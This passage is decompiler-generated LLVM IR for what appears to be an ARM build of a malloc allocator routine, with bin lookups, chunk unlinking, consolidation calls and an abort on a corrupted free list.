  store i32 120, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  %v4_b4d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 120) to i32*), align 4
  store i32 %v4_b4d4, i32* %ip.global-to-local, align 4
  store i32 46304, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_b4d4)
  %v0_b4e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b4e0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r1, align 4
  %v4_b4ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 16) to i32*), align 4
  store i32 %v4_b4ec, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_b4f8.136 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_b4ec)
  %v0_b4f8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_b4f8, -32
  br i1 %tmp, label %dec_label_pc_b51c, label %dec_label_pc_b500

dec_label_pc_b500:                                ; preds = %entry
  store i32 93664, i32* %r2.global-to-local, align 4
  %v0_b504 = call i32 @__aeabi_read_tp()
  store i32 %v0_b504, i32* %r0.global-to-local, align 4
  %v3_b508 = load i16, i16* @global_var_222f0.75, align 2
  %v4_b508 = sext i16 %v3_b508 to i32
  store i32 %v4_b508, i32* @r2, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_b514 = add i32 %v4_b508, %v0_b504
  %v4_b514 = inttoptr i32 %v3_b514 to i32*
  store i32 12, i32* %v4_b514, align 4
  br label %dec_label_pc_bda0

dec_label_pc_b51c:                                ; preds = %entry
  %v1_b51c = add i32 %v0_b4f8, 11
  store i32 %v1_b51c, i32* %r0.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v2_b528 = icmp ugt i32 %v1_b51c, 14
  %v7_b528 = icmp eq i32 %v1_b51c, 15
  %v2_b52c = xor i1 %v7_b528, true
  %v3_b52c = and i1 %v2_b528, %v2_b52c
  br i1 %v3_b52c, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_b51c
  %v5_b52c = and i32 %v1_b51c, -8
  store i32 %v5_b52c, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_b51c, %bb
  %v4_b530 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_b530, i32* @r0, align 4
  %v1_b534 = inttoptr i32 %v4_b530 to i32*
  %v2_b534 = load i32, i32* %v1_b534, align 4
  store i32 %v2_b534, i32* @r4, align 4
  %v2_b538 = xor i1 %v2_b528, true
  %v3_b538 = or i1 %v7_b528, %v2_b538
  br i1 %v3_b538, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_b53c = urem i32 %v2_b534, 2
  %v2_b53c = icmp eq i32 %v1_b53c, 0
  br i1 %v2_b53c, label %dec_label_pc_b544, label %dec_label_pc_b554

dec_label_pc_b544:                                ; preds = %bb140
  %v2_b544 = icmp eq i32 %v2_b534, 0
  br i1 %v2_b544, label %dec_label_pc_b54c, label %dec_label_pc_b930

dec_label_pc_b54c:                                ; preds = %dec_label_pc_b544
  %v0_b54c = call i32 @__malloc_consolidate()
  store i32 %v0_b54c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b930

dec_label_pc_b554:                                ; preds = %bb140
  %v0_b554 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_b554, %v2_b534
  br i1 %tmp201, label %dec_label_pc_b57c, label %dec_label_pc_b55c

dec_label_pc_b55c:                                ; preds = %dec_label_pc_b554
  %v1_b55c = add i32 %v4_b530, -4
  store i32 %v1_b55c, i32* %r1.global-to-local, align 4
  %v3_b560 = udiv i32 %v0_b554, 8
  store i32 %v3_b560, i32* %r2.global-to-local, align 4
  %v4_b564 = mul nuw i32 %v3_b560, 4
  %v5_b564 = add i32 %v4_b564, %v1_b55c
  %v6_b564 = inttoptr i32 %v5_b564 to i32*
  %v7_b564 = load i32, i32* %v6_b564, align 4
  store i32 %v7_b564, i32* %r0.global-to-local, align 4
  %v2_b568 = icmp eq i32 %v7_b564, 0
  br i1 %v2_b568, label %dec_label_pc_b57c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b55c
  %v2_b56c = add i32 %v7_b564, 8
  %v3_b56c = inttoptr i32 %v2_b56c to i32*
  %v4_b56c = load i32, i32* %v3_b56c, align 4
  store i32 %v4_b56c, i32* %r3.global-to-local, align 4
  store i32 %v2_b56c, i32* %r0.global-to-local, align 4
  store i32 %v2_b56c, i32* %r4.global-to-local, align 4
  store i32 %v4_b56c, i32* %v6_b564, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b57c:                                ; preds = %dec_label_pc_b55c, %dec_label_pc_b554
  %tmp202 = icmp ugt i32 %v0_b554, 255
  br i1 %tmp202, label %dec_label_pc_b5cc, label %dec_label_pc_b584

dec_label_pc_b584:                                ; preds = %dec_label_pc_b57c
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_b58c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  %v3_b590 = udiv i32 %v0_b554, 8
  store i32 %v3_b590, i32* @r7, align 4
  %v4_b594 = mul nuw i32 %v3_b590, 8
  %v5_b594 = add i32 %v4_b58c, %v4_b594
  store i32 %v5_b594, i32* %r3.global-to-local, align 4
  %v1_b598 = add i32 %v5_b594, 44
  store i32 %v1_b598, i32* %ip.global-to-local, align 4
  %v1_b59c = add i32 %v5_b594, 56
  %v2_b59c = inttoptr i32 %v1_b59c to i32*
  %v3_b59c = load i32, i32* %v2_b59c, align 4
  store i32 %v3_b59c, i32* %r0.global-to-local, align 4
  %v9_b5a0 = icmp eq i32 %v3_b59c, %v1_b598
  br i1 %v9_b5a0, label %dec_label_pc_b72c, label %dec_label_pc_b5a8

dec_label_pc_b5a8:                                ; preds = %dec_label_pc_b584
  %v2_b5a8 = add i32 %v3_b59c, %v0_b554
  store i32 %v2_b5a8, i32* %r3.global-to-local, align 4
  %v1_b5ac = add i32 %v2_b5a8, 4
  %v2_b5ac = inttoptr i32 %v1_b5ac to i32*
  %v3_b5ac = load i32, i32* %v2_b5ac, align 4
  store i32 %v3_b5ac, i32* %r2.global-to-local, align 4
  %v1_b5b0 = add i32 %v3_b59c, 12
  %v2_b5b0 = inttoptr i32 %v1_b5b0 to i32*
  %v3_b5b0 = load i32, i32* %v2_b5b0, align 4
  store i32 %v3_b5b0, i32* %r1.global-to-local, align 4
  %v1_b5b4 = or i32 %v3_b5ac, 1
  store i32 %v1_b5b4, i32* %r2.global-to-local, align 4
  %v1_b5b8 = add i32 %v3_b59c, 8
  store i32 %v1_b5b8, i32* %r4.global-to-local, align 4
  store i32 %v1_b5b4, i32* %v2_b5ac, align 4
  %v0_b5c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b5c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_b5c0 = add i32 %v1_b5c0, 8
  %v3_b5c0 = inttoptr i32 %v2_b5c0 to i32*
  store i32 %v0_b5c0, i32* %v3_b5c0, align 4
  %v0_b5c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_b5c4 = add i32 %v1_b5c4, 12
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  store i32 %v0_b5c4, i32* %v3_b5c4, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b5cc:                                ; preds = %dec_label_pc_b57c
  store i32 %v0_b554, i32* %r0.global-to-local, align 4
  %v1_b5d0 = call i32 @__malloc_largebin_index(i32 %v0_b554)
  store i32 %v1_b5d0, i32* %r0.global-to-local, align 4
  %v0_b5d4 = load i32, i32* @r4, align 4
  %v1_b5d4 = and i32 %v0_b5d4, 2
  %v2_b5d4 = icmp eq i32 %v1_b5d4, 0
  store i32 %v1_b5d0, i32* @r7, align 4
  br i1 %v2_b5d4, label %dec_label_pc_b72c, label %dec_label_pc_b5e0

dec_label_pc_b5e0:                                ; preds = %dec_label_pc_b5cc
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  %v4_b5e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_b5e8, i32* @r0, align 4
  %v0_b5ec = call i32 @__malloc_consolidate()
  store i32 %v0_b5ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b72c

dec_label_pc_b5f4:                                ; preds = %dec_label_pc_b740
  %v1_b5f4 = add i32 %v3_b740, 4
  %v2_b5f4 = inttoptr i32 %v1_b5f4 to i32*
  %v3_b5f4 = load i32, i32* %v2_b5f4, align 4
  store i32 %v3_b5f4, i32* %r3.global-to-local, align 4
  %v0_b5f8 = load i32, i32* @sl, align 4
  %v1_b5fc = and i32 %v3_b5f4, -4
  store i32 %v1_b5fc, i32* %r4.global-to-local, align 4
  %v1_b600 = add i32 %v3_b740, 12
  %v2_b600 = inttoptr i32 %v1_b600 to i32*
  %v3_b600 = load i32, i32* %v2_b600, align 4
  store i32 %v3_b600, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_b5f8, 255
  br i1 %tmp203, label %dec_label_pc_b65c, label %dec_label_pc_b608

dec_label_pc_b608:                                ; preds = %dec_label_pc_b5f4
  %v9_b608 = icmp eq i32 %v3_b600, %v0_b660
  br i1 %v9_b608, label %dec_label_pc_b610, label %dec_label_pc_b65c

dec_label_pc_b610:                                ; preds = %dec_label_pc_b608
  %v0_b610 = load i32, i32* @sb, align 4
  %v1_b610 = add i32 %v0_b610, 48
  %v2_b610 = inttoptr i32 %v1_b610 to i32*
  %v3_b610 = load i32, i32* %v2_b610, align 4
  store i32 %v3_b610, i32* %r3.global-to-local, align 4
  %v9_b614 = icmp eq i32 %v3_b740, %v3_b610
  br i1 %v9_b614, label %dec_label_pc_b61c, label %dec_label_pc_b65c

dec_label_pc_b61c:                                ; preds = %dec_label_pc_b610
  %v1_b61c = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_b5fc, %v1_b61c
  br i1 %tmp204, label %dec_label_pc_b624, label %dec_label_pc_b65c

dec_label_pc_b624:                                ; preds = %dec_label_pc_b61c
  %v2_b624 = sub i32 %v1_b5fc, %v0_b5f8
  store i32 %v2_b624, i32* %r2.global-to-local, align 4
  %v2_b628 = add i32 %v0_b5f8, %v3_b740
  store i32 %v2_b628, i32* %r3.global-to-local, align 4
  %v1_b62c = or i32 %v0_b5f8, 1
  store i32 %v1_b62c, i32* %r0.global-to-local, align 4
  %v1_b630 = or i32 %v2_b624, 1
  store i32 %v1_b630, i32* %r1.global-to-local, align 4
  %v1_b634 = add i32 %v3_b740, 8
  store i32 %v1_b634, i32* %r4.global-to-local, align 4
  %v2_b638 = add i32 %v0_b660, 8
  %v3_b638 = inttoptr i32 %v2_b638 to i32*
  store i32 %v2_b628, i32* %v3_b638, align 4
  %v0_b63c = load i32, i32* %r3.global-to-local, align 4
  %v1_b63c = load i32, i32* %ip.global-to-local, align 4
  %v2_b63c = add i32 %v1_b63c, 12
  %v3_b63c = inttoptr i32 %v2_b63c to i32*
  store i32 %v0_b63c, i32* %v3_b63c, align 4
  %v0_b640 = load i32, i32* %r0.global-to-local, align 4
  %v1_b640 = load i32, i32* @r6, align 4
  %v2_b640 = add i32 %v1_b640, 4
  %v3_b640 = inttoptr i32 %v2_b640 to i32*
  store i32 %v0_b640, i32* %v3_b640, align 4
  %v0_b644 = load i32, i32* %r3.global-to-local, align 4
  %v1_b644 = load i32, i32* @sb, align 4
  %v2_b644 = add i32 %v1_b644, 48
  %v3_b644 = inttoptr i32 %v2_b644 to i32*
  store i32 %v0_b644, i32* %v3_b644, align 4
  %v0_b648 = load i32, i32* %r2.global-to-local, align 4
  %v1_b648 = load i32, i32* %r3.global-to-local, align 4
  %v3_b648 = add i32 %v1_b648, %v0_b648
  %v4_b648 = inttoptr i32 %v3_b648 to i32*
  store i32 %v0_b648, i32* %v4_b648, align 4
  %v0_b64c = load i32, i32* %r1.global-to-local, align 4
  %v1_b64c = load i32, i32* %r3.global-to-local, align 4
  %v2_b64c = add i32 %v1_b64c, 4
  %v3_b64c = inttoptr i32 %v2_b64c to i32*
  store i32 %v0_b64c, i32* %v3_b64c, align 4
  %v0_b650 = load i32, i32* %ip.global-to-local, align 4
  %v1_b650 = load i32, i32* %r3.global-to-local, align 4
  %v2_b650 = add i32 %v1_b650, 12
  %v3_b650 = inttoptr i32 %v2_b650 to i32*
  store i32 %v0_b650, i32* %v3_b650, align 4
  %v0_b654 = load i32, i32* %ip.global-to-local, align 4
  %v1_b654 = load i32, i32* %r3.global-to-local, align 4
  %v2_b654 = add i32 %v1_b654, 8
  %v3_b654 = inttoptr i32 %v2_b654 to i32*
  store i32 %v0_b654, i32* %v3_b654, align 4
  br label %dec_label_pc_bd84

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b61c, %dec_label_pc_b610, %dec_label_pc_b608, %dec_label_pc_b5f4
  %v9_b65c = icmp eq i32 %v1_b5fc, %v0_b5f8
  %v2_b660 = add i32 %v3_b600, 8
  %v3_b660 = inttoptr i32 %v2_b660 to i32*
  store i32 %v0_b660, i32* %v3_b660, align 4
  %v0_b664 = load i32, i32* %ip.global-to-local, align 4
  %v1_b664 = load i32, i32* %r5.global-to-local, align 4
  %v2_b664 = add i32 %v1_b664, 12
  %v3_b664 = inttoptr i32 %v2_b664 to i32*
  store i32 %v0_b664, i32* %v3_b664, align 4
  br i1 %v9_b65c, label %dec_label_pc_b7bc.loopexit, label %dec_label_pc_b678

dec_label_pc_b678:                                ; preds = %dec_label_pc_b65c
  %v0_b678 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_b678, 255
  br i1 %tmp205, label %dec_label_pc_b69c, label %dec_label_pc_b680

dec_label_pc_b680:                                ; preds = %dec_label_pc_b678
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v1_b684 = load i32, i32* %r8.global-to-local, align 4
  %v2_b684 = add i32 %v1_b684, ptrtoint (i32* @global_var_22290.79 to i32)
  %v3_b684 = inttoptr i32 %v2_b684 to i32*
  %v4_b684 = load i32, i32* %v3_b684, align 4
  %v3_b688 = udiv i32 %v0_b678, 8
  store i32 %v3_b688, i32* %r0.global-to-local, align 4
  %v4_b68c = mul nuw i32 %v3_b688, 8
  %v5_b68c = add i32 %v4_b684, %v4_b68c
  store i32 %v5_b68c, i32* %r3.global-to-local, align 4
  %v1_b690 = add i32 %v5_b68c, 44
  store i32 %v1_b690, i32* %ip.global-to-local, align 4
  %v1_b694 = add i32 %v5_b68c, 52
  %v2_b694 = inttoptr i32 %v1_b694 to i32*
  %v3_b694 = load i32, i32* %v2_b694, align 4
  store i32 %v3_b694, i32* @lr, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b678
  store i32 %v0_b678, i32* %r0.global-to-local, align 4
  %v1_b6a0 = call i32 @__malloc_largebin_index(i32 %v0_b678)
  store i32 %v1_b6a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %ip.global-to-local, align 4
  %v1_b6a8 = load i32, i32* %r8.global-to-local, align 4
  %v2_b6a8 = add i32 %v1_b6a8, ptrtoint (i32* @global_var_22290.79 to i32)
  %v3_b6a8 = inttoptr i32 %v2_b6a8 to i32*
  %v4_b6a8 = load i32, i32* %v3_b6a8, align 4
  %v4_b6ac = mul i32 %v1_b6a0, 8
  %v5_b6ac = add i32 %v4_b6a8, %v4_b6ac
  store i32 %v5_b6ac, i32* %r3.global-to-local, align 4
  %v1_b6b0 = add i32 %v5_b6ac, 44
  store i32 %v1_b6b0, i32* %ip.global-to-local, align 4
  %v1_b6b4 = add i32 %v5_b6ac, 52
  %v2_b6b4 = inttoptr i32 %v1_b6b4 to i32*
  %v3_b6b4 = load i32, i32* %v2_b6b4, align 4
  store i32 %v3_b6b4, i32* @lr, align 4
  %v9_b6b8 = icmp eq i32 %v3_b6b4, %v1_b6b0
  br i1 %v9_b6b8, label %dec_label_pc_b6f4, label %dec_label_pc_b6c0

dec_label_pc_b6c0:                                ; preds = %dec_label_pc_b69c
  %v1_b6c0 = add i32 %v5_b6ac, 56
  %v2_b6c0 = inttoptr i32 %v1_b6c0 to i32*
  %v3_b6c0 = load i32, i32* %v2_b6c0, align 4
  store i32 %v3_b6c0, i32* %r1.global-to-local, align 4
  %v1_b6c4 = add i32 %v3_b6c0, 4
  %v2_b6c4 = inttoptr i32 %v1_b6c4 to i32*
  %v3_b6c4 = load i32, i32* %v2_b6c4, align 4
  store i32 %v3_b6c4, i32* %r3.global-to-local, align 4
  %v0_b6c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b6c8 = icmp ult i32 %v0_b6c8, %v3_b6c4
  br i1 %v3_b6c8, label %.thread, label %dec_label_pc_b6e4.preheader

.thread:                                          ; preds = %dec_label_pc_b6c0
  store i32 %v1_b6b0, i32* @lr, align 4
  store i32 %v3_b6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4.preheader:                      ; preds = %dec_label_pc_b6c0
  %v2_b6d0 = or i32 %v0_b6c8, 1
  store i32 %v2_b6d0, i32* %r2.global-to-local, align 4
  %v1_b6e4179 = add i32 %v3_b6b4, 4
  %v2_b6e4180 = inttoptr i32 %v1_b6e4179 to i32*
  %v3_b6e4181 = load i32, i32* %v2_b6e4180, align 4
  store i32 %v3_b6e4181, i32* %r3.global-to-local, align 4
  %v3_b6e8183 = icmp ult i32 %v2_b6d0, %v3_b6e4181
  br i1 %v3_b6e8183, label %dec_label_pc_b6e0, label %dec_label_pc_b6f0

dec_label_pc_b6e0:                                ; preds = %dec_label_pc_b6e4.preheader, %dec_label_pc_b6e0
  %v0_b6f0184 = phi i32 [ %v3_b6e0, %dec_label_pc_b6e0 ], [ %v3_b6b4, %dec_label_pc_b6e4.preheader ]
  %v1_b6e0 = add i32 %v0_b6f0184, 8
  %v2_b6e0 = inttoptr i32 %v1_b6e0 to i32*
  %v3_b6e0 = load i32, i32* %v2_b6e0, align 4
  store i32 %v3_b6e0, i32* @lr, align 4
  %v1_b6e4 = add i32 %v3_b6e0, 4
  %v2_b6e4 = inttoptr i32 %v1_b6e4 to i32*
  %v3_b6e4 = load i32, i32* %v2_b6e4, align 4
  store i32 %v3_b6e4, i32* %r3.global-to-local, align 4
  %v3_b6e8 = icmp ult i32 %v2_b6d0, %v3_b6e4
  br i1 %v3_b6e8, label %dec_label_pc_b6e0, label %dec_label_pc_b6f0

dec_label_pc_b6f0:                                ; preds = %dec_label_pc_b6e0, %dec_label_pc_b6e4.preheader
  %v0_b6f0.lcssa = phi i32 [ %v3_b6b4, %dec_label_pc_b6e4.preheader ], [ %v3_b6e0, %dec_label_pc_b6e0 ]
  %v1_b6f0 = add i32 %v0_b6f0.lcssa, 12
  %v2_b6f0 = inttoptr i32 %v1_b6f0 to i32*
  %v3_b6f0 = load i32, i32* %v2_b6f0, align 4
  store i32 %v3_b6f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %.thread, %dec_label_pc_b69c, %dec_label_pc_b680, %dec_label_pc_b6f0
  %v0_b714 = phi i32 [ %v1_b6b0, %dec_label_pc_b69c ], [ %v1_b690, %dec_label_pc_b680 ], [ %v3_b6f0, %dec_label_pc_b6f0 ], [ %v3_b6c0, %.thread ]
  %v0_b708 = phi i32 [ %v1_b6a0, %dec_label_pc_b69c ], [ %v3_b688, %dec_label_pc_b680 ], [ %v1_b6a0, %dec_label_pc_b6f0 ], [ %v1_b6a0, %.thread ]
  %v1_b6f8 = phi i32 [ %v1_b6a8, %dec_label_pc_b69c ], [ %v1_b684, %dec_label_pc_b680 ], [ %v1_b6a8, %dec_label_pc_b6f0 ], [ %v1_b6a8, %.thread ]
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r2.global-to-local, align 4
  %v2_b6f8 = add i32 %v1_b6f8, ptrtoint (i32* @global_var_22290.79 to i32)
  %v3_b6f8 = inttoptr i32 %v2_b6f8 to i32*
  %v4_b6f8 = load i32, i32* %v3_b6f8, align 4
  %v3_b6fc = sdiv i32 %v0_b708, 32
  store i32 %v3_b6fc, i32* %r3.global-to-local, align 4
  %v4_b700 = mul nsw i32 %v3_b6fc, 4
  %v5_b700 = add i32 %v4_b6f8, %v4_b700
  store i32 %v5_b700, i32* %r1.global-to-local, align 4
  %v1_b704 = add i32 %v5_b700, 820
  %v2_b704 = inttoptr i32 %v1_b704 to i32*
  %v3_b704 = load i32, i32* %v2_b704, align 4
  %v1_b708 = urem i32 %v0_b708, 32
  store i32 %v1_b708, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_b710 = shl i32 1, %v1_b708
  %v8_b710 = or i32 %v3_b704, %v7_b710
  store i32 %v8_b710, i32* %r3.global-to-local, align 4
  %v1_b714 = load i32, i32* @r6, align 4
  %v2_b714 = add i32 %v1_b714, 12
  %v3_b714 = inttoptr i32 %v2_b714 to i32*
  store i32 %v0_b714, i32* %v3_b714, align 4
  %v0_b718 = load i32, i32* @lr, align 4
  %v1_b718 = load i32, i32* @r6, align 4
  %v2_b718 = add i32 %v1_b718, 8
  %v3_b718 = inttoptr i32 %v2_b718 to i32*
  store i32 %v0_b718, i32* %v3_b718, align 4
  %v0_b71c = load i32, i32* %r3.global-to-local, align 4
  %v1_b71c = load i32, i32* %r1.global-to-local, align 4
  %v2_b71c = add i32 %v1_b71c, 820
  %v3_b71c = inttoptr i32 %v2_b71c to i32*
  store i32 %v0_b71c, i32* %v3_b71c, align 4
  %v0_b720 = load i32, i32* @r6, align 4
  %v1_b720 = load i32, i32* @lr, align 4
  %v2_b720 = add i32 %v1_b720, 12
  %v3_b720 = inttoptr i32 %v2_b720 to i32*
  store i32 %v0_b720, i32* %v3_b720, align 4
  %v0_b724 = load i32, i32* @r6, align 4
  %v1_b724 = load i32, i32* %ip.global-to-local, align 4
  %v2_b724 = add i32 %v1_b724, 8
  %v3_b724 = inttoptr i32 %v2_b724 to i32*
  store i32 %v0_b724, i32* %v3_b724, align 4
  %v0_b740.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b740

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b5cc, %dec_label_pc_b584, %dec_label_pc_b5e0
  store i32 68, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* %r1.global-to-local, align 4
  %v4_b734 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 68) to i32*), align 4
  store i32 %v4_b734, i32* @sb, align 4
  %v0_b738 = load i32, i32* @sl, align 4
  %v1_b738 = add i32 %v0_b738, 16
  store i32 %v1_b738, i32* @fp, align 4
  %v1_b73c = add i32 %v4_b734, 52
  store i32 %v1_b73c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_b740

dec_label_pc_b740:                                ; preds = %dec_label_pc_b6f4, %dec_label_pc_b72c
  %v0_b660 = phi i32 [ %v0_b740.pre, %dec_label_pc_b6f4 ], [ %v1_b73c, %dec_label_pc_b72c ]
  %v1_b740 = add i32 %v0_b660, 12
  %v2_b740 = inttoptr i32 %v1_b740 to i32*
  %v3_b740 = load i32, i32* %v2_b740, align 4
  store i32 %v3_b740, i32* @r6, align 4
  %v9_b744 = icmp eq i32 %v3_b740, %v0_b660
  br i1 %v9_b744, label %dec_label_pc_b74c, label %dec_label_pc_b5f4

dec_label_pc_b74c:                                ; preds = %dec_label_pc_b740
  %v0_b74c = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_b74c, 256
  %v0_b804.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_b74c.dec_label_pc_b804_crit_edge, label %dec_label_pc_b754

dec_label_pc_b74c.dec_label_pc_b804_crit_edge:    ; preds = %dec_label_pc_b74c
  %.pre200 = mul i32 %v0_b804.pre, 8
  br label %dec_label_pc_b804

dec_label_pc_b754:                                ; preds = %dec_label_pc_b74c
  %v4_b754 = mul i32 %v0_b804.pre, 8
  %v5_b754 = add i32 %v4_b754, %v0_b660
  store i32 %v5_b754, i32* %r3.global-to-local, align 4
  %v1_b758 = add i32 %v5_b754, -8
  store i32 %v1_b758, i32* %r1.global-to-local, align 4
  %v1_b75c = add i32 %v5_b754, 4
  %v2_b75c = inttoptr i32 %v1_b75c to i32*
  %storemerge.pre = load i32, i32* %v2_b75c, align 4
  br label %dec_label_pc_b7fc

dec_label_pc_b764:                                ; preds = %dec_label_pc_b7fc
  %v1_b764 = add i32 %v1_b78c, 4
  %v2_b764 = inttoptr i32 %v1_b764 to i32*
  %v3_b764 = load i32, i32* %v2_b764, align 4
  store i32 %v3_b764, i32* %r3.global-to-local, align 4
  %v1_b768 = and i32 %v3_b764, -4
  store i32 %v1_b768, i32* %r2.global-to-local, align 4
  %v3_b76c = icmp ult i32 %v1_b768, %v0_b74c
  %v1_b770 = add i32 %v1_b78c, 12
  %v2_b770 = inttoptr i32 %v1_b770 to i32*
  %v3_b770 = load i32, i32* %v2_b770, align 4
  store i32 %v3_b770, i32* %r0.global-to-local, align 4
  br i1 %v3_b76c, label %dec_label_pc_b7fc, label %dec_label_pc_b778

dec_label_pc_b778:                                ; preds = %dec_label_pc_b764
  %v1_b778 = add i32 %v1_b78c, 8
  %v2_b778 = inttoptr i32 %v1_b778 to i32*
  %v3_b778 = load i32, i32* %v2_b778, align 4
  store i32 %v3_b778, i32* %r1.global-to-local, align 4
  %v1_b77c = add i32 %v3_b778, 12
  %v2_b77c = inttoptr i32 %v1_b77c to i32*
  %v3_b77c = load i32, i32* %v2_b77c, align 4
  store i32 %v3_b77c, i32* %r3.global-to-local, align 4
  %v9_b780 = icmp eq i32 %v3_b77c, %v1_b78c
  br i1 %v9_b780, label %dec_label_pc_b788, label %dec_label_pc_b794

dec_label_pc_b788:                                ; preds = %dec_label_pc_b778
  %v1_b788 = add i32 %v3_b770, 8
  %v2_b788 = inttoptr i32 %v1_b788 to i32*
  %v3_b788 = load i32, i32* %v2_b788, align 4
  store i32 %v3_b788, i32* %r3.global-to-local, align 4
  %v9_b78c = icmp eq i32 %v3_b788, %v1_b78c
  br i1 %v9_b78c, label %dec_label_pc_b798, label %dec_label_pc_b794

dec_label_pc_b794:                                ; preds = %dec_label_pc_b778, %dec_label_pc_b788
  %v0_b794 = call i32 @abort()
  store i32 %v0_b794, i32* %r0.global-to-local, align 4
  %v0_b798.pre = load i32, i32* @sl, align 4
  %v1_b798.pre = load i32, i32* @r2, align 4
  %v0_b7a0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_b798

dec_label_pc_b798:                                ; preds = %dec_label_pc_b788, %dec_label_pc_b794
  %v1_b7a0 = phi i32 [ %v3_b770, %dec_label_pc_b788 ], [ %v0_b794, %dec_label_pc_b794 ]
  %v0_b7a0 = phi i32 [ %v3_b778, %dec_label_pc_b788 ], [ %v0_b7a0.pre, %dec_label_pc_b794 ]
  %v1_b798 = phi i32 [ %v1_b768, %dec_label_pc_b788 ], [ %v1_b798.pre, %dec_label_pc_b794 ]
  %v0_b798 = phi i32 [ %v0_b74c, %dec_label_pc_b788 ], [ %v0_b798.pre, %dec_label_pc_b794 ]
  %v2_b798 = sub i32 %v1_b798, %v0_b798
  store i32 %v2_b798, i32* %lr.global-to-local, align 4
  %v2_b7a0 = add i32 %v1_b7a0, 8
  %v3_b7a0 = inttoptr i32 %v2_b7a0 to i32*
  store i32 %v0_b7a0, i32* %v3_b7a0, align 4
  %v0_b7a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_b7a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b7a4 = add i32 %v1_b7a4, 12
  %v3_b7a4 = inttoptr i32 %v2_b7a4 to i32*
  store i32 %v0_b7a4, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_b7a8 = add i32 %v0_b7a8, 8
  store i32 %v1_b7a8, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_b798, 15
  br i1 %tmp207, label %dec_label_pc_b7c8, label %dec_label_pc_b7b0

dec_label_pc_b7b0:                                ; preds = %dec_label_pc_b798
  %v1_b7b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_b7b0 = add i32 %v1_b7b0, %v0_b7a8
  store i32 %v2_b7b0, i32* %r2.global-to-local, align 4
  %v1_b7b4 = add i32 %v2_b7b0, 4
  %v2_b7b4 = inttoptr i32 %v1_b7b4 to i32*
  %v3_b7b4 = load i32, i32* %v2_b7b4, align 4
  store i32 %v3_b7b4, i32* %r3.global-to-local, align 4
  store i32 %v1_b7a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b7bc

dec_label_pc_b7bc.loopexit:                       ; preds = %dec_label_pc_b65c
  %v1_b668 = load i32, i32* @r6, align 4
